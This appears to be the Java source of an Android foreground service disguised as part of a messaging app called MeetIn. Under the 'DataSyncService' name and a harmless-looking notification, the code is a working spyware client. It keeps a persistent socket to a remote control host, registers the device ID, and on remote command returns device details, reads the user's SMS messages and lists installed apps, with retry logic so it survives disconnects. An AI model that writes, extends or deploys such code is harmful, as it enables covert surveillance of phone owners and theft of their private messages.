package chat.meetin.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DataSyncService extends Service {
    private static final String TAG = "DataSyncService";
    private static final String CHANNEL_ID = "MeetInChannel";
    private static final int NOTIF_ID = 1;

    private Socket socket;
    private PrintWriter writer;
    private BufferedReader reader;
    private volatile boolean running = true;
    private volatile boolean connected = false;
    private String deviceId;
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private int retryCount = 0;
    private long lastPingTime = 0;
    private boolean waitingForPong = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();

        // Use a permission-safe identifier so service creation cannot fail on Android/OEM variants.
        deviceId = DeviceInfo.getDeviceId(this);

        Log.d(TAG, "Service Created: " + deviceId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            startForeground(NOTIF_ID, createNotification());
            Log.d(TAG, "Service started in foreground");
        } catch (SecurityException e) {
            Log.e(TAG, "Foreground service permission missing", e);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start foreground", e);
        }
        executor.execute(this::connectAndServe);
        return START_STICKY;
    }

    private void connectAndServe() {
        while (running) {
            try {
                if (!connected) {
                    connect();
                }
                if (connected) {
                    serveCommands();
                }
            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
                connected = false;
                closeSocket();
                retryCount++;
            }
            int delay = Math.min(30000, 1000 * (int) Math.pow(2, Math.min(retryCount, 6)));
            try { Thread.sleep(delay); } catch (InterruptedException ignored) {}
        }
    }

    private void connect() throws Exception {
        Log.d(TAG, "Connecting to " + Config.HOST + ":" + Config.PORT);
        socket = new Socket();
        socket.setKeepAlive(true);
        socket.setTcpNoDelay(true);
        socket.setSoTimeout(30000);
        socket.connect(new java.net.InetSocketAddress(Config.HOST, Config.PORT), 15000);
        writer = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
        reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        writer.println("DEVICE:" + deviceId);
        writer.flush();
        writer.println("READY");
        writer.flush();
        connected = true;
        retryCount = 0;
        lastPingTime = System.currentTimeMillis();
        Log.d(TAG, "Connected!");
    }

    private void serveCommands() {
        try {
            String command;
            while (connected && running) {
                if (reader.ready()) {
                    command = reader.readLine();
                    if (command != null && !command.isEmpty()) {
                        Log.d(TAG, "Command: " + command);
                        String response = executeCommand(command);
                        if (response != null) {
                            writer.println(response);
                            writer.flush();
                            writer.println("---END---");
                            writer.flush();
                        }
                    }
                } else {
                    long now = System.currentTimeMillis();
                    if (now - lastPingTime > 30000) {
                        if (waitingForPong) {
                            Log.w(TAG, "Ping timeout, reconnecting...");
                            connected = false;
                            break;
                        }
                        writer.println("ping");
                        writer.flush();
                        lastPingTime = now;
                        waitingForPong = true;
                    }
                    Thread.sleep(100);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Serve error: " + e.getMessage());
            connected = false;
        }
    }

    private void closeSocket() {
        try {
            if (reader != null) reader.close();
            if (writer != null) writer.close();
            if (socket != null) socket.close();
        } catch (Exception ignored) {}
        socket = null;
        writer = null;
        reader = null;
    }

    private String executeCommand(String command) {
        if (command.equalsIgnoreCase("ping")) {
            waitingForPong = false;
            return "PONG";
        }
        if (command.startsWith("@")) {
            String[] parts = command.split(":", 2);
            if (parts.length < 2) return "Invalid target";
            String target = parts[0].substring(1);
            String cmd = parts[1];
            if (target.equals("all") || target.equals(deviceId) || target.equals(Build.MODEL)) {
                return executeCmd(cmd);
            }
            return "Ignored";
        }
        return executeCmd(command);
    }

    private String executeCmd(String cmd) {
        if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getFullInfo(this);
        if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
        if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getUserApps(this);
        if (cmd.equalsIgnoreCase("device")) return deviceId;
        if (cmd.equalsIgnoreCase("exit")) {
            running = false;
            stopSelf();
            return "EXIT";
        }
        return "Unknown. Try: ping, info, sms read, apps list, device, exit";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "MeetIn", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Private Messaging app for individuals and businesses");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("MeetIn")
                .setContentText("Private Messaging app for individuals and businesses")
                .setSmallIcon(R.drawable.ic_stat_meetin)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        running = false;
        connected = false;
        closeSocket();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
